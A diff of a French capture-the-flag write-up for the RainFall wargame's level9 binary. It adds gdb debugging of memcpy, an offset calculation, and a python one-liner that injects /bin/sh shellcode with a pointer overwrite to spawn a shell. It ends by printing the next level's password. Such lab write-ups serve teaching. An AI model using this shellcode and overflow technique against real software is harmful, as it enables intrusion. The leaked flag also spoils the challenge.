@@ -7,8 +7,9 @@ level9@RainFall:~$ ./level9 55 66
 level9@RainFall:~$ ./level9 55 663333333333
 level9@RainFall:~$ ./level9
 ```
-Ok so we have an executable which does nothing.
-On remarque que le programme semble etre du cpp:
+Donc nous avaons un executable qui ne fait rien.
+Il semble que ce soit du cpp
+
 ```
 objdump -M intel -d level9
 
@@ -51,3 +52,29 @@ Offset de 108
 Shellcode : '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' # http://shell-storm.org/shellcode/files/shellcode-827.php
 
 On remarque donc que EAX est situé à partir de 108 caracteres.
+L'objectif va etre d'utiliser le call à la fonction set annotation avec l'argument argv[1] puisqu'il s'agit de notre seul point d'entrée.
+Faisons un breakpoint sur le memcpy pour observer.
+
+```
+gdb ./level9
+gdb) b memcpy
+Breakpoint 1 at 0x8048510
+(gdb) r "AAAA"
+Starting program: /home/user/level9/level9 "AAAA"
+
+Breakpoint 1, 0xb7dc5920 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/4x $esp
+0xbffff69c:	0x08048738	0x0804a00c	0xbffff8d4	0x00000004
+```
+
+Donc on retiens 0x0804a00c qui correspond à notre premier argument auquel on ajoute 4 afin de la deferencer pour la faire commencer au debut du shell.
+0x804a010
+
+Notre shellcode fait 28 bytes, notre adresse 4, l'adresse du buffer 4 donc notre padding 76 .
+
+```
+./level9 $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(76)+"\x0c\xa0\x04\x08"')
+# un shell s'ouvre
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
